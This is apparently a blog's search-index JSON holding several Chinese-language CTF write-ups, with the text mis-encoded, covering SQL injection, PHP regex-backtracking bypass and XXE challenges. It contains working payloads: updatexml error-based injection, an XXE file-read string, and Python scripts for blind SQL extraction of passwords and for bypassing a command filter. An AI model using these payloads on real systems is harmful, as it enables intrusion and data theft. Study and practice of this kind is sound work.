{"meta":{"title":"æœˆå‡ºä»äº‘","subtitle":"","description":"","author":null,"url":"http://example.com","root":"/"},"pages":[{"title":"AWD","date":"2014-12-22T04:39:04.000Z","updated":"2020-11-17T06:14:07.642Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"CTF","date":"2020-11-17T05:49:23.000Z","updated":"2020-11-17T06:11:45.482Z","comments":true,"path":"categories/index-1.html","permalink":"http://example.com/categories/index-1.html","excerpt":"","text":""},{"title":"BUU","date":"2020-11-17T06:04:40.000Z","updated":"2020-11-17T06:16:19.998Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"ssti","date":"2020-11-17T06:06:49.000Z","updated":"2020-11-17T06:16:27.450Z","comments":true,"path":"tags/index-1.html","permalink":"http://example.com/tags/index-1.html","excerpt":"","text":""},{"title":"æ¯”èµ›","date":"2020-11-17T06:07:10.000Z","updated":"2020-11-17T06:16:31.708Z","comments":true,"path":"tags/index-2.html","permalink":"http://example.com/tags/index-2.html","excerpt":"","text":""},{"title":"SQLæ³¨å…¥","date":"2020-11-17T06:07:24.000Z","updated":"2020-11-17T06:16:34.701Z","comments":true,"path":"tags/index-3.html","permalink":"http://example.com/tags/index-3.html","excerpt":"","text":""},{"title":"Java","date":"2020-11-17T06:07:36.000Z","updated":"2020-11-17T06:16:38.291Z","comments":true,"path":"tags/index-4.html","permalink":"http://example.com/tags/index-4.html","excerpt":"","text":""},{"title":"AWD","date":"2020-11-17T06:07:49.000Z","updated":"2020-11-17T06:08:03.116Z","comments":true,"path":"tags/index-5.html","permalink":"http://example.com/tags/index-5.html","excerpt":"","text":""},{"title":"æ¸—é€","date":"2020-11-17T06:09:45.000Z","updated":"2020-11-17T06:16:44.308Z","comments":true,"path":"tags/index-6.html","permalink":"http://example.com/tags/index-6.html","excerpt":"","text":""},{"title":"å¼€å‘","date":"2020-11-17T06:11:43.000Z","updated":"2020-11-17T06:12:00.335Z","comments":true,"path":"categories/index-2.html","permalink":"http://example.com/categories/index-2.html","excerpt":"","text":""},{"title":"æ¸—é€","date":"2020-11-17T06:12:08.000Z","updated":"2020-11-17T06:12:21.520Z","comments":true,"path":"categories/index-3.html","permalink":"http://example.com/categories/index-3.html","excerpt":"","text":""},{"title":"php","date":"2020-11-17T06:18:09.000Z","updated":"2020-11-17T06:18:40.651Z","comments":true,"path":"tags/index-7.html","permalink":"http://example.com/tags/index-7.html","excerpt":"","text":""},{"title":"ååºåˆ—åŒ–","date":"2020-11-17T06:18:43.000Z","updated":"2020-11-17T06:18:51.497Z","comments":true,"path":"tags/index-8.html","permalink":"http://example.com/tags/index-8.html","excerpt":"","text":""},{"title":"nodejs","date":"2020-11-17T06:18:56.000Z","updated":"2020-11-17T06:19:16.847Z","comments":true,"path":"tags/index-9.html","permalink":"http://example.com/tags/index-9.html","excerpt":"","text":""},{"title":"search","date":"2020-11-17T06:21:26.000Z","updated":"2020-11-17T06:21:42.054Z","comments":true,"path":"search/index.html","permalink":"http://example.com/search/index.html","excerpt":"","text":""}],"posts":[{"title":"RCTF2015EasySQL","slug":"RCTF2015EasySQL","date":"2020-11-18T09:57:30.000Z","updated":"2020-11-18T14:11:21.941Z","comments":true,"path":"2020/11/18/RCTF2015EasySQL/","link":"","permalink":"http://example.com/2020/11/18/RCTF2015EasySQL/","excerpt":"","text":"è€ƒç‚¹ï¼šä¸€ä¸ªSQLæ³¨å…¥ï¼ŒäºŒæ¬¡æ³¨å…¥+æŠ¥é”™æ³¨å…¥ å½“æˆ‘ä»¬æ³¨å†Œç”¨æˆ·ä¿®æ”¹å¯†ç çš„æ—¶å€™ä¾¿ä¼šè§¦å‘ æˆ‘ä»¬å¯ä»¥æµ‹è¯•ä¸€ä¸‹è¢«è¿‡æ»¤äº†ä»€ä¹ˆï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198length +handlerlikeselect sleepdatabasedeletehavingoras-~BENCHMARKlimitleftselectinsertsys.schema_auto_increment_columnsjoinright#&amp;&amp;&amp;\\handler-- -----+INFORMATION--;!%+xor&lt;&gt;(&gt;&lt;).^=ANDBYCASTCOLUMNCOUNTCREATEENDcase&#x27;1&#x27;=&#x27;1whenadmin&#x27;&quot;length +lengthREVERSEasciiselect databaseleftright&#x27;union||oorr/////**/*/**/ananddGROUPHAVINGIFINTOJOINLEAVELEFTLEVELsleepLIKENAMESNEXTNULLOFON|infromation_schemauserORORDERORDSCHEMASELECTSETTABLETHENUPDATEUSERUSINGVALUEVALUESWHENWHEREADDANDpreparesetupdatedeletedropinsetCASTCOLUMNCONCATGROUP_CONCATgroup_concatCREATEDATABASEDATABASESalterDELETEDROPfloorrand()information_schema.tablesTABLE_SCHEMA%dfconcat_ws()concatLIMITORDONextractvalueorder CAST()byORDEROUTFILERENAMEREPLACESCHEMASELECTSETupdatexmlSHOWSQLTABLETHENTRUEinstrbenchmarkformatbinsubstringordUPDATEVALUESVARCHARVERSIONWHENWHERE/*` ,users%0a%0bmidforBEFOREREGEXPRLIKEinsys schemmaSEPARATORXORCURSORFLOORsys.schema_table_statistics_with_bufferINFILEcount%0cfrom%0d%a0=@else ç›´æ¥ç”¨åˆ«äººçš„å­—å…¸æ¥æŸ¥ä¸€ä¸‹ å¤§æ¦‚å¯¹æˆ‘ä»¬æ³¨å…¥æœ‰å½±å“çš„åªæœ‰ç©ºæ ¼ï¼Œselectçš„è¯æˆ‘ä»¬å¯ä»¥ç”¨å¤§å°å†™çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œäºæ˜¯å»mysqlé‡Œé¢å°è¯•æ„é€ å‡ºè¯­å¥ï¼š 1234567mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;mysql&gt; select * from websites where id &#x3D;1 and(select(updatexml(1,concat(&#39;~&#39;,(select(database()))),1)));ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39; å¾—åˆ°æ³¨å…¥è¯­å¥ï¼š 12admin&quot;^(select(updatexml(1,concat(&#x27;~&#x27;,(select(database()))),1)))##XPATH syntax error: &#x27;~web_sqli&#x27; å¾—åˆ°æ•°æ®åº“çš„åå­—. ä¸‹ä¸€æ­¥è·å–è¡¨åï¼š 1admin&quot;^(select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)))# è¿™æ ·çš„è¯ä¼šæŠ¥é”™ï¼ŒSubquery returns more than 1 rowï¼Œå› ä¸ºä¸æ­¢ä¸€ä¸ªè¡¨ï¼Œé‚£æˆ‘ä»¬æ·»åŠ group_concatå‡½æ•° åœ¨mysqlä¸­æµ‹è¯•ï¼š 12345mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));ERROR 1242 (21000): Subquery returns more than 1 rowmysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));ERROR 2013 (HY000): Lost connection to MySQL server during querymysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e))); å¾—åˆ°è¡¨åï¼š 1XPATH syntax error: &#x27;~article,flag,users&#x27; è¿™é‡Œæå‰å‰§é€ä¸€ä¸‹ï¼Œflagè¡¨çš„ä¸œè¥¿æ˜¯å‡flagï¼Œçº¯ç²¹ä½œè€…æå¿ƒæ€çš„ï¼Œæˆ‘ä¸€ç›´è§‰å¾—è¿™ç§ä¸œè¥¿å¾ˆå¤šä½™å¥½å§ã€‚ 123mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e));ERROR 1105 (HY000): XPATH syntax error: &#39;~STID,STNAME,STSEX,STAGE,STPHONE&#39;mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e)); å¾—åˆ°å­—æ®µåï¼š 1XPATH syntax error: &#x27;~name,pwd,email,real_flag_1s_her&#x27; è¿™é‡Œå…¶å®æˆ‘ä»¬å°±å¯ä»¥å‘ç°ä¸€ä¸ªä¸æ–¹ä¾¿çš„åœ°æ–¹äº†ï¼ŒæŠ¥é”™æ³¨å…¥çš„å›æ˜¾æ˜¯æœ‰é™çš„ï¼Œæ‰€ä»¥è¿™é‡Œåé¢åº”è¯¥æ˜¯hereï¼Œå´æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥ æ³¨å…¥ï¼š 1admin&quot;^(select(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users))),0x7e)))# å¾—åˆ°çš„ä¸œè¥¿å¾ˆå¥‡æ€ªï¼š ~xxxx,xxx,xxxä»€ä¹ˆçš„ï¼Œè¿™å°±å¾ˆæ¶å¿ƒäººäº†ï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥åŒ¹é…æˆ‘ä»¬éœ€è¦çš„æ•°æ® åˆ«äººçš„è¯­å¥ï¼š 12admin&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))# å¾—åˆ°å‰åŠæ®µçš„flagï¼š 1XPATH syntax error: &#39;:flag&#123;8091937b-0547-42a3-b7b3-41&#39; è¿™æ ·çš„è¯è¿˜æ˜¯ä¸å¤Ÿï¼Œæˆ‘ä»¬åº”è¯¥è·å–å…¨éƒ¨çš„æ•°æ®ï¼Œäºæ˜¯ç»§ç»­æ„é€ ï¼š 12345678910111213141516ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(group_concat(STNAME))from student)),0x7e)));ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select reverse((group_concat(STNAME)))from student)),0x7e)));ERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));ERROR 2013 (HY000): Lost connection to MySQL server during querymysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));ERROR 2006 (HY000): MySQL server has gone awayNo connection. Trying to reconnect...Connection id: 11Current database: webosERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e))); å› ä¸ºMarkdownè‡ªåŠ¨çš„å¼±æ™ºä¸å…¨ï¼Œå¯¼è‡´æˆ‘fuzzäº†å·¨ä»–å¦ˆä¹… 12admin&quot;||(updatexml(1,concat(0x3a,(select(reverse(group_concat(real_flag_1s_here)))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))# å¾—åˆ°flagï¼š 1flag&#123;8091937b-0547-42a3-b7b3-415a267a6a46&#125;","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"FBCTF2018RCEService","slug":"FBCTF2018RCEService","date":"2020-11-17T07:15:27.000Z","updated":"2020-11-17T07:51:04.195Z","comments":true,"path":"2020/11/17/FBCTF2018RCEService/","link":"","permalink":"http://example.com/2020/11/17/FBCTF2018RCEService/","excerpt":"","text":"è¦ç›²è¯•è¯•å‡ºæ¥ã€‚ã€‚ã€‚å¤§ä½¬è¯´æ˜¯æœ‰æºç ï¼š 123456789101112131415161718192021222324&lt;?phpputenv(&#x27;PATH=/home/rceservice/jail&#x27;);if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123; $json = $_REQUEST[&#x27;cmd&#x27;]; if (!is_string($json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/&#x27;, $json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; else &#123; echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;; $cmd = json_decode($json, true)[&#x27;cmd&#x27;]; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo &#x27;Invalid input&#x27;; &#125; echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;; &#125;&#125;?&gt; è¿™é“é¢˜æ³¨æ„è¿™é‡Œï¼š 1putenv(&#x27;PATH=/home/rceservice/jail&#x27;); æ‰€ä»¥æˆ‘ä»¬æƒ³è¦æ‰§è¡Œå‘½ä»¤çš„è¯å¿…é¡»é€šè¿‡/bin/catæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆæœ¬äººä¸æ˜¯å¾ˆèƒ½æ˜ç™½åŸå› ã€‚ã€‚ï¼‰ æ­£åˆ™ç»•è¿‡ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡Pç‰›å¤§ä½¬çš„æ–‡ç« ï¼š 1https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;use-pcre-backtrack-limit-to-bypass-restrict.html é˜…è¯»Pç‰›å¤§ä½¬çš„æ–‡ç« ï¼Œå¤§è‡´æ„æ€æ˜¯ï¼ŒPHPçš„æ­£åˆ™å¹¶ä¸æ˜¯é€šè¿‡æ ¹æ®æ­£åˆ™çš„åŒ¹é…æ¥å†³å®šä¸‹ä¸€æ­¥çš„ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶çš„è¯ï¼Œæ­£åˆ™ä¾¿ä¼šæ— é™çš„å‘ååŒ¹é…ï¼Œç›´åˆ°æœ«å°¾ä¹‹åï¼Œå¦‚æœæ­£åˆ™æ²¡æœ‰èƒ½å¤ŸæˆåŠŸåŒ¹é…ç»“å°¾ï¼Œå°±ä¼šå¾€å›å›æº¯ï¼Œæ¥æŸ¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„æƒ…å†µ ç±»ä¼¼Pç‰›å¤§ä½¬çš„ä¾‹å­ï¼Œå¦‚æœæŒ‰ç…§æˆ‘ä»¬çš„æ€è·¯çš„è¯ï¼Œå½“åŒ¹é…åˆ° ;çš„æ—¶å€™ï¼Œå·²ç»åŒ¹é…æˆåŠŸï¼Œæ‰€ä»¥å°±åº”è¯¥åœä¸‹æ¥äº†ï¼Œä½†æ˜¯ç”±äº.*å¯ä»¥åŒ¹é…ä»»æ„ï¼Œæ•…æˆ‘ä»¬ä¼šä¸€ç›´åŒ¹é…åˆ°æœ€åä¸€æ­¥ï¼Œä½†æ­¤æ—¶æ­£åˆ™æ²¡æœ‰åŒ¹é…æˆåŠŸï¼Œå°±ä¼šå¾€å‰æ¨ï¼Œç›´åˆ°æ­£åˆ™åŒ¹é…æˆåŠŸã€‚ åˆå› ä¸ºPç‰›å¸ˆå‚…è¯´çš„ï¼Œåªè¦å›æº¯100000æ­¤å°±ä¼šå¤±è´¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å‘é€ä¸€ä¸²è¶…çº§é•¿çš„å­—ç¬¦ä¸²å³å¯ 123456789import requestsparams = &#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;123&quot;:&quot;&#x27; + &quot;a&quot;*(1000000) + &#x27;&quot;&#125;&#x27;params = &#123;&quot;cmd&quot;:params&#125;url = &quot;http://e23f7266-20a3-4aa0-bfbc-8a9502764002.node3.buuoj.cn&quot;res = requests.post(url=url,data=params).textprint(res) æ³¨æ„è¿™é‡Œä¸€å®šè¦å‘é€poståŒ…ï¼ŒgetåŒ…æ— æ³•æ¥å—è¿™ä¹ˆé•¿çš„å‚æ•°ï¼Œä¼ è¿‡å»å°±å¯ä»¥å¾—åˆ°flagäº†","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"PHPçš„ä¸€ä¸ªå†…ç½®ç±»","slug":"PHPçš„ä¸€ä¸ªå†…ç½®ç±»","date":"2020-11-16T13:41:28.000Z","updated":"2020-11-16T13:50:35.444Z","comments":true,"path":"2020/11/16/PHPçš„ä¸€ä¸ªå†…ç½®ç±»/","link":"","permalink":"http://example.com/2020/11/16/PHP%E7%9A%84%E4%B8%80%E4%B8%AA%E5%86%85%E7%BD%AE%E7%B1%BB/","excerpt":"","text":"æŸåº—é‡Œæ¯”èµ›é¢˜ç›®ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119&lt;?phpclass User&#123; private static $c = 0; public function __construct($ra,$rb) &#123;// $c = $ra;// $c = $rb; &#125; function a() &#123; return ++self::$c; &#125; function b() &#123; return ++self::$c; &#125; function c() &#123; return ++self::$c; &#125; function d() &#123; return ++self::$c; &#125; function e() &#123; return ++self::$c; &#125; function f() &#123; return ++self::$c; &#125; function g() &#123; return ++self::$c; &#125; function h() &#123; return ++self::$c; &#125; function i() &#123; return ++self::$c; &#125; function j() &#123; return ++self::$c; &#125; function k() &#123; return ++self::$c; &#125; function l() &#123; return ++self::$c; &#125; function m() &#123; return ++self::$c; &#125; function n() &#123; return ++self::$c; &#125; function o() &#123; return ++self::$c; &#125; function p() &#123; return ++self::$c; &#125; function q() &#123; return ++self::$c; &#125; function r() &#123; return ++self::$c; &#125; function s() &#123; return ++self::$c; &#125; function t() &#123; return ++self::$c; &#125;&#125;$rc=$_GET[&quot;rc&quot;];$rb=$_GET[&quot;rb&quot;];$ra=$_GET[&quot;ra&quot;];$rd=$_GET[&quot;rd&quot;];$method= new $rc($ra, $rb);var_dump($method-&gt;$rd()); æˆ‘ä»¬å¯ä»¥æ§åˆ¶å››ä¸ªå‚æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬æ˜æ˜¾çŸ¥é“ï¼Œè¿™é‡Œçš„Userç±»å®Œå…¨æ²¡æœ‰æ„ä¹‰ï¼Œé¢˜ç›®ç»™å‡ºæç¤ºè®©æˆ‘ä»¬æƒ³æƒ³è¿˜æœ‰ä»€ä¹ˆç±»ï¼Œæƒ³äº†åŠå¤©åº”è¯¥æ˜¯å†…ç½®ç±»ï¼Œé˜Ÿé‡Œçš„w4nderå¸ˆå‚…ç›´æ¥ç»™æˆ‘expäº†ï¼ŒWTMç›´æ¥å¼€èˆ” 1?rc&#x3D;SimpleXMLElement&amp;ra&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;&amp;rb&#x3D;2&amp;rd&#x3D;__toString","categories":[],"tags":[]},{"title":"CISCN2019DAY2WEB1","slug":"CISCN2019DAY2WEB1","date":"2020-11-16T09:53:14.000Z","updated":"2020-11-17T06:15:49.535Z","comments":true,"path":"2020/11/16/CISCN2019DAY2WEB1/","link":"","permalink":"http://example.com/2020/11/16/CISCN2019DAY2WEB1/","excerpt":"","text":"è™½ç„¶å¯¹äºSQLæ³¨å…¥æˆ‘ä¸ªäººæ˜¯ç›¸å½“ä¸å±‘çš„ã€‚å½“å‰çš„ç¯å¢ƒä¸‹å·²ç»å­˜åœ¨å½»åº•ç£¨ç­SQLæ³¨å…¥çš„æŠ€æœ¯äº†ï¼Œä½†æ˜¯æ¯”èµ›å‡ºç°çš„é¢‘ç‡ä¾ç„¶ä¸ä½ï¼Œæ‰€ä»¥åªèƒ½æŠŠå®ƒæ¡å›æ¥äº†ã€‚ã€‚orz æ‹¿åˆ°æ–‡ä»¶å…ˆä»è¿™é“é¢˜å¼€å§‹è¯´å§ï¼Œæ‰«ç›®å½•èƒ½æ‰«å‡ºæ¥robots.txt,ä¸‹é¢æœ‰*.php.bak,æç¤ºæˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–æ–‡ä»¶ï¼Œ å¾—åˆ°ä»£ç æˆ‘å°†ä»–ç¨å¾®ä¿®æ”¹æ–¹ä¾¿fuzzä¹‹åé•¿è¿™æ ·ï¼š 12345678910111213141516171819&lt;?php// include &quot;config.php&quot;; $id = $_POST[1]; echo $id; echo &quot;&lt;br&gt;&quot;; $id=addslashes($id); $path=addslashes($path); echo $id; echo &quot;&lt;br&gt;&quot;; $id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id); $path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path); echo $id;// $result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);// $row=mysqli_fetch_array($result,MYSQLI_ASSOC);// $path=&quot;./&quot; . $row[&quot;path&quot;];// header(&quot;Content-Type: image/jpeg&quot;);// readfile($path); æ˜ç¡®ç›®æ ‡æˆ‘ä»¬æƒ³è¦å¾—åˆ°çš„ç›®æ ‡æ˜¯ä»€ä¹ˆï¼Œå¾ˆæ˜æ˜¾ï¼Œè¿™é“é¢˜çš„æŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š 1$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;); æ³¨å…¥åŸç†åˆ†æå…¶ä¸­idå’Œpathéƒ½æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å…¶å®å¯ä»¥é€šè¿‡åæ‰idåé¢çš„å•å¼•å·çš„æ–¹å¼ï¼Œè¿›è€Œè¾¾åˆ°æ§åˆ¶æŸ¥è¯¢è¯­å¥çš„æ“ä½œï¼Œå¦‚å›¾æ‰€ç¤ºï¼š åœ¨SQLè¯­å¥å½“ä¸­ï¼Œ\\è½¬ä¹‰ä¹Ÿæ˜¯å­˜åœ¨çš„ï¼Œåªè¦è¯¥ç¬¦å·å­˜åœ¨ï¼Œä¾¿ä¼šè‡ªåŠ¨çš„å¯¹æ•°æ®è¿›è¡Œè½¬ä¹‰ï¼Œæ¯”å¦‚ï¼š å¦‚æœ åœ¨å•å¼•å·é¢å‰åŠ ä¸Š\\ï¼Œå°±ä¼šè¢«ç³»ç»Ÿè®¤å®šä¸ºå­—ç¬¦ä¸²ç±»å‹çš„ â€˜ ,ä¹Ÿå°±èµ·ä¸åˆ°é—­åˆè¯­å¥çš„ä½œç”¨äº†ã€‚ å›åˆ°æ³¨å…¥ä¸Šæ¥ï¼Œæˆ‘ä»¬å¦‚æœæƒ³è¦é€ƒé€¸æ‰å¯¹idçš„æ³¨å…¥ï¼Œæƒ³è¦è‡ªå·±æ§åˆ¶è¯­å¥çš„è¯ï¼Œåº”è¯¥æ„é€ å¦‚ä¸‹ä»£ç ï¼š é€šè¿‡ä¸Šé¢çš„åˆ†ææˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œidåé¢çš„å•å¼•å·ç”±äºè¢«\\è¿›è¡Œäº†ä¿®é¥°ï¼Œä¹Ÿå°±æ— æ³•èµ·åˆ°é—­åˆçš„ä½œç”¨äº†ï¼Œè€Œ nameçš„éƒ¨åˆ†è¢«æˆ‘ä»¬çš„å•å¼•å·é—­åˆä¹‹åï¼Œå†é€šè¿‡æˆ–é€»è¾‘ï¼Œå°±å¯ä»¥æ§åˆ¶ä»»æ„æŸ¥è¯¢äº†ã€‚ é¢˜ç›®çš„ç»•è¿‡ä¸Šé¢ä¸€æ®µä¸­æˆ‘ä»¬å·²ç»çŸ¥é“ç¬¬ä¸€æ­¥çš„ä¸­æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å¯¹idè¿›è¡Œæ§åˆ¶ï¼Œä½¿å¾—idæœ€ç»ˆè¾“å‡ºçš„å€¼æœ€ç»ˆä¸º æ–œæ ï¼ˆ\\ï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨pathè¿›è¡Œæ³¨å…¥äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°idå’Œpathå…¶å®éƒ½è¢«ä¿®é¥°äº†ï¼Œä¹Ÿå°±æ— æ³•ç›´æ¥è¾“å…¥æ–œæ æ¥ç»•è¿‡ï¼Œåˆ©ç”¨ä¸Šé¢çš„ä»£ç æ¼”ç¤ºå¦‚ä¸‹ï¼š è¿™é“é¢˜çš„å…³é”®ä»£ç å¦‚ä¸‹ï¼š 12$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path); æˆ‘ä»¬é¦–å…ˆè¦çŸ¥é“çš„æ˜¯ï¼Œè™½ç„¶è¿™é‡Œå†™çš„æ˜¯\\0 ,ç„¶è€Œå®é™…ä¸Šä¾ç„¶æ˜¯\\0,å‰é¢çš„\\æ˜¯ç”¨äºè½¬ä¹‰çš„ã€‚ è¿™æ ·æƒ³çš„è¯ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡æ„é€ \\0çš„æ–¹å¼æ¥å°è¯•ç»•è¿‡ é¡ºåºå¦‚ä¸‹ æˆ‘ä»¬è¾“å…¥çš„ä¸ºâ€\\0â€ -&gt; ç»è¿‡addslasheså‡½æ•°ä¹‹åâ€\\\\0â€,å†ç»è¿‡str_replaceå‡½æ•°ä¹‹åå³ä¸º\\äº†ï¼Œ é‚£è¿™é‡Œå¯èƒ½å°±æœ‰äººæƒ³é—®äº†ï¼Œä¸ºä»€ä¹ˆä¸ç”¨\\â€˜ æ¥ç»•è¿‡ï¼Œè¿™æ˜¯å› ä¸ºå¦‚æœä½¿ç”¨\\ å’Œ â€˜ç»„åˆæ–¹å¼ï¼Œç»è¿‡addslashesçš„æ—¶å€™è¿™ä¸¤ä¸ªç¬¦å·éƒ½ä¼šè¢«è½¬ä¹‰ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±æ²¡æœ‰åŠæ³•åˆ©ç”¨str_replaceå‡½æ•°ï¼Œäºæ˜¯æˆ‘ä»¬æ„é€ payloadç¬¬ä¸€æ­¥å¦‚ä¸‹ï¼š é€æ­¥fuzz.. æœ€ç»ˆåœ¨mysqlå½“ä¸­å¾—åˆ°å¦‚ä¸‹è¯­å¥å¯ä»¥fuzzï¼š 1select * from websites where id = if( ord( substr((select database() ),1,1 ))&gt;145,1,2); äºæ˜¯æ„é€ å‡ºåœ¨urlå½“ä¸­ï¼š 1http:&#x2F;&#x2F;a624b8c4-8225-4f4b-8681-7f29d013c51b.node3.buuoj.cn&#x2F;image.php?id&#x3D;\\0&amp;path&#x3D;or id&#x3D;if( ord( substr((select database() ),1,1 ))&gt;&#x3D;99,1,0) %23 é‚£ä¹ˆå°±è¯¥æ„é€ è„šæœ¬äº† 1234567891011121314151617181920212223import requestsurl = &quot;http://a624b8c4-8225-4f4b-8681-7f29d013c51b.node3.buuoj.cn/image.php?id=\\\\0&amp;path=&quot;# ä¸Šé¢çš„idä¸€å®šè¦æ‰‹åŠ¨åŠ ä¸Šä¸€ä¸ª\\è¿›è¡Œè½¬ä¹‰ï¼Œä¸ç„¶ä¼šå‡ºé”™çš„# print(url)# print(len(requests.get(&quot;http://a624b8c4-8225-4f4b-8681-7f29d013c51b.node3.buuoj.cn/image.php?id=\\\\0&amp;path= or&quot;).text))# len = 117007flag = &quot;&quot;for i in range(1, 999): for j in range(47, 140): sql = &quot;or id=if( ord( substr((select password from users ),&#123;&#125;,1 ))&gt;=&#123;&#125;,1,0) %23&quot;.format(i, j) # print(url+sql) # databasename = djtdogjob res = requests.get(url + sql).text if len(res) &lt; 1170: print(len(res)) print(chr(j-1)) flag += chr(j-1) print(&quot;flag:&quot; + flag) i += 1 break 